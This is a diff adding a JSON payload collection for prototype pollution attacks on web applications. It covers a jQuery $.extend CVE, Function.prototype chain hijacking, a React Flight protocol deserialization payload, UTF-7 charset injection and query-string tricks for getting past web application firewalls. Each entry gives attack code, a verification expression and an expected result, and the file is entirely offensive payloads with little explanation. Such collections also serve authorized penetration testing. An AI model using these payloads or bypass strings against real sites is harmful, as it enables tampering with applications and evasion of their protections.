@@ -1,0 +1,130 @@
+{
+    "jquery_pp": {
+        "name": "jQuery Prototype Pollution (CVE-2019-11358)",
+        "severity": "CRITICAL",
+        "payloads": [
+            {
+                "name": "Basic $.extend() Pollution",
+                "code": "$.extend(true, {}, {\"__proto__\": {\"polluted\": \"YES\"}});",
+                "verify": "Object.prototype.polluted",
+                "expected": "\"YES\""
+            },
+            {
+                "name": "toString Override",
+                "code": "$.extend(true, {}, {\"__proto__\": {\"toString\": function(){return \"HACKED\"}}});",
+                "verify": "({}).toString()",
+                "expected": "\"HACKED\""
+            },
+            {
+                "name": "Check Global Pollution",
+                "code": "Object.getOwnPropertyNames(Object.prototype).includes('polluted')",
+                "verify": "Object.prototype.polluted",
+                "expected": "true atau 'YES'"
+            }
+        ]
+    },
+    "function_proto": {
+        "name": "Function.prototype Chain Pollution",
+        "severity": "HIGH",
+        "payloads": [
+            {
+                "name": "Constructor.constructor.prototype",
+                "code": "constructor.constructor.prototype.polluted = \"HACKED\"",
+                "verify": "({}).polluted",
+                "expected": "\"HACKED\""
+            },
+            {
+                "name": "Function Prototype Hijacking",
+                "code": "Object.getPrototypeOf(Object.getPrototypeOf(Object.getPrototypeOf([]))).map = function(){console.log(\"HIJACKED\"); return []}",
+                "verify": "[1,2,3].map(x => x)",
+                "expected": "console.log HIJACKED"
+            },
+            {
+                "name": "Direct __proto__ Access",
+                "code": "({}).__proto__.constructor.prototype.test = \"polluted\"",
+                "verify": "({}).test",
+                "expected": "\"polluted\""
+            }
+        ]
+    },
+    "react_flight": {
+        "name": "React Flight Protocol (CVE-2025-55182)",
+        "severity": "CRITICAL",
+        "payloads": [
+            {
+                "name": "Check React exists",
+                "code": "typeof React !== \"undefined\" ? \"React FOUND\" : \"React NOT FOUND\"",
+                "verify": "Lihat hasil",
+                "expected": "\"React FOUND\" jika vulnerable"
+            },
+            {
+                "name": "Flight Protocol Payload",
+                "code": "const payload = {\"_formData\": {\"get\": \"$1:then:constructor\"}}; JSON.stringify(payload)",
+                "verify": "Lihat payload di console",
+                "expected": "Constructor chain accessible"
+            },
+            {
+                "name": "Deserialization Check",
+                "code": "const p = JSON.parse('{\"_formData\": {\"get\": \"$1:then:constructor\"}}'); p._formData.get",
+                "verify": "Jalankan payload check",
+                "expected": "\"$1:then:constructor\""
+            }
+        ]
+    },
+    "utf7_bypass": {
+        "name": "UTF-7 Charset Override",
+        "severity": "HIGH",
+        "payloads": [
+            {
+                "name": "Inject charset via prototype",
+                "code": "Object.prototype.charset = \"utf-7\"",
+                "verify": "document.charset",
+                "expected": "\"utf-7\""
+            },
+            {
+                "name": "Check current charset",
+                "code": "document.charset || document.characterSet",
+                "verify": "Lihat charset saat ini",
+                "expected": "Bisa berubah ke utf-7"
+            },
+            {
+                "name": "Meta charset test",
+                "code": "Object.prototype.encoding = 'iso-2022-jp'; document.querySelector('meta[charset]')?.getAttribute('charset')",
+                "verify": "Cek meta charset",
+                "expected": "Bisa berubah via prototype"
+            }
+        ]
+    },
+    "waf_bypass": {
+        "name": "WAF Bypass Techniques",
+        "severity": "HIGH",
+        "payloads": [
+            {
+                "name": "Case Variation",
+                "url": "?__PROTO__[bypass]=1",
+                "alternative": "?__Proto__[bypass]=true",
+                "verify": "Object.prototype.bypass",
+                "expected": "1 atau true"
+            },
+            {
+                "name": "URL Encoding",
+                "url": "?__proto__%5Bbypass%5D=1",
+                "note": "%5B = [ | %5D = ]",
+                "verify": "Object.prototype.bypass",
+                "expected": "1"
+            },
+            {
+                "name": "Nested Objects",
+                "url": "?a[b][__proto__][bypass]=1",
+                "verify": "({}).bypass",
+                "expected": "1"
+            },
+            {
+                "name": "JSON Payload",
+                "code": "{\"__proto__\": {\"bypass\": true}}",
+                "verify": "Object.prototype.bypass",
+                "expected": "true"
+            }
+        ]
+    }
+}
